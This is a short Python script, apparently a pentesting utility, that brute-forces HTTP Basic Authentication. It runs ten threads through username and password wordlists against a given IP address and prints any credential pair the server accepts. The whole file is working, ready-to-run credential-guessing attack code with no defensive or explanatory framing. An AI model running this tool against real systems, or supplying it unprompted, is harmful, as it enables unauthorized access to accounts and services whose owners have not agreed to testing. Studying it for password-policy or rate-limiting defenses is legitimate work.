#!/usr/bin/env python3

import queue
import requests
import base64
import sys
import threading
import time
import os
usage = """
Brute Force Basic Authentication
python3 basic-auth-bf.py -i [IP_ADDRESS] -U [username_list] -P [password_list]
"""
username_list = sys.argv[4]
password_list = sys.argv[6]
ip_addess = sys.argv[2]

usernameList = open(username_list, 'r',encoding = "ISO-8859-1").read().splitlines()


class StopThread(StopIteration):
    pass


threading.SystemExit = SystemExit, StopThread


class UsernameThread(threading.Thread):

    def __init__(self, queue, tid, ):
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid

    def run(self):

        while True:

            username = None
            try:
                username = self.queue.get(timeout=5)
            except queue.Empty:
                return
            try:
                with open(password_list, encoding = "ISO-8859-1") as fp1:
                    pass_lines = fp1.readlines()
                    for pass_line in pass_lines:
                        uss_pass = username.strip() + ":" + pass_line.strip()
                        message_bytes = uss_pass.encode('ascii')
                        base64_bytes = base64.b64encode(message_bytes)
                        base64_message = base64_bytes.decode('ascii')
                        r = requests.get(
                            "http://" + ip_addess, headers={"Authorization": "Basic {0}".format(base64_message)})
                        print(f"Checking... {uss_pass}")
                        if r.status_code == 200:
                            print(f"\n\nFOUND: {uss_pass}")

                            # os.system("kill -9 $(ps aux | grep -w basic-auth-bf.py | awk '{print $2}'| head -n 1)")

            except:
                raise
            self.queue.task_done()


if len(sys.argv) != 7 or sys.argv[0] == "--help" or sys.argv[0] == "-h":
    print(usage)
else:
    queue = queue.Queue()

    threads = []
    for i in range(1, 10):  

        worker = UsernameThread(queue, i)
        worker.setDaemon(True)
        worker.start()
        threads.append(worker)

    for username in usernameList:
        queue.put(username)
        

    queue.join()

    for item in threads:

        item.join()

    print("Testing Complete!")
